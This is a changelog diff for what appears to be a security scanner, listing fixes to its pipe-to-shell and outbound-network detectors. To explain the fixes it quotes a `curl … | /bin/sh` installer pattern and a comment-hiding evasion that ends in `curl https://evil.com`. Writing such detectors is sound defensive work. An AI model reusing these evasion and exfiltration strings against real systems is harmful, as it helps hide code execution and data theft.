@@ -7,6 +7,24 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.6.0] - 2026-08-19
+
+### Fixed
+- `pipeToShell` (`SK-SHELL-002` HIGH) now matches absolute-path shells
+  (`/bin/sh`, `/usr/bin/bash`, `/bin/zsh`) and `sudo -E` / `exec` prefixes
+  after the pipe, so an RCE installer using `curl … | /bin/sh` can no longer
+  slip past the headline detector and score MEDIUM. Bare `sh`/`bash`/`zsh`
+  still match.
+- `stripShellComment` (`SK-NET-001`) is now quote-aware: a `#` inside a
+  single/double-quoted string is no longer treated as a comment start, so
+  `echo "x # " && curl https://evil.com` no longer hides the trailing `curl`
+  exfil. A real `#` comment in code still strips.
+- `httpClient` (`SK-NET-001`) now matches all `requests.<method>` verbs
+  (put/patch/delete/head/options, not just get/post) and `fetch\s*(`
+  (allowing a space), so an outbound `requests.put(...)` exfil no longer
+  slips past the network rule. Genuine `requests.get`/`fetch(...)` still
+  match.
+
 ## [0.4.0] - 2026-08-11
 
 ### Fixed
